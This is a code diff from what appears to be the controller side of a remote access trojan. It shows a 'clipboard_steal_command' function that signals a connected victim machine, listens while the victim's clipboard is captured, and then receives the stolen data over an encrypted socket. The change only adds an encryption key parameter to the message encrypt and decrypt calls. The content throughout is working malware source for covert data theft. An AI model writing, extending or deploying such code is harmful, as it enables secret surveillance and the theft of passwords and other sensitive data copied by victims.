@@ -10,7 +10,7 @@ from termcolor import colored
 import socket
 import time
 
-def clipboard_steal_command(client_output: bytes, conn_obj: socket.socket) -> str:
+def clipboard_steal_command(client_output: bytes, conn_obj: socket.socket, key: bytes) -> str:
     """Handle the clipboard stealing routine.
 
     Parameters
@@ -29,7 +29,7 @@ def clipboard_steal_command(client_output: bytes, conn_obj: socket.socket) -> st
 
     received_data = []
 
-    decrypted_client_message = decrypt_message(client_output)  # Signal message
+    decrypted_client_message = decrypt_message(client_output, key)  # Signal message
     if decrypted_client_message.decode() != "STARTED":
         return colored("[-] An error has occured when starting the clipboard steal function. Please try again in a few moments.", "red")
 
@@ -45,7 +45,7 @@ def clipboard_steal_command(client_output: bytes, conn_obj: socket.socket) -> st
         while True:
             input("Press Ctrl+C to stop and receive clipboard data: ")
     except KeyboardInterrupt:
-        conn_obj.sendall(encrypt_message("END"))
+        conn_obj.sendall(encrypt_message("END", key))
         print(
             f"\nEnded clipboard listening session on {time.strftime('%H:%M:%S', time.localtime())}"
         )
@@ -55,7 +55,7 @@ def clipboard_steal_command(client_output: bytes, conn_obj: socket.socket) -> st
     try:
         while True:
             try:
-                output = decrypt_message(conn_obj.recv(4096))
+                output = decrypt_message(conn_obj.recv(4096), key)
                 if output:
                     decoded_output = output.strip().decode() 
                     received_data.extend(decoded_output.split("\n"))
